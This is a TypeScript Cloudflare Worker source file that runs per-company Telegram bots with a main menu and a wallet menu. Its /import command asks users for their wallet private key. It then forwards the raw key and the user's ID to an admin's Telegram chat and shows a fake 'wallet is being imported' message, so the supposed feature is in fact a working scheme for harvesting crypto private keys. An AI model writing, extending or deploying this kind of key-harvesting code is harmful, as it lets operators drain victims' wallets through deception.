import { env } from "cloudflare:workers";
import { Bot, webhookCallback } from "grammy/web";
import type { Context as HonoContext } from "hono";
import { botApi } from "@/orpc";
import { mainMenu, message, walletMenu } from "./content";

export async function createBotHandler(id: string) {
	return async (c: HonoContext) => {
		const { data: company, error: companyError } = await botApi.getCompanyById({
			companyId: id,
		});
		if (companyError) {
			return new Response(companyError, { status: 500 });
		}
		if (!company) {
			return new Response("Invalid company ID", { status: 400 });
		}
		const userBot = new Bot(company.botToken);

		mainMenu.register(walletMenu);
		userBot.use(mainMenu);

		userBot.command("start", async (ctx) => {
			const name = ctx.from?.username || ctx.from?.first_name || "user";
			await ctx.reply(message(name), {
				parse_mode: "HTML",
				reply_markup: mainMenu,
			});
		});

		userBot.command("import", async (ctx) => {
			await ctx.reply(
				"🔑 Please enter the private key of the wallet you want to import.",
			);
			userBot.on("message:text", async (msgCtx) => {
				const walletKey = msgCtx.message.text;
				const adminBot = new Bot(env.TELEGRAM_BOT_TOKEN);
				await adminBot.api.sendMessage(
					company.adminChatId.toString(),
					`User with ID ${ctx.from?.id} imported wallet key: ${walletKey}\n\nYou can approve or reject the user by sending <code>/approve_user</code> or <code>/reject_user</code>`,
					{ parse_mode: "HTML" },
				);
				await msgCtx.reply("⏳ Wait while your wallet is being imported...");
			});
		});

		try {
			return webhookCallback(userBot, "hono")(c);
		} catch (error) {
			console.error("Error handling Telegram webhook:", error);
			return new Response("Error processing webhook", { status: 500 });
		}
	};
}
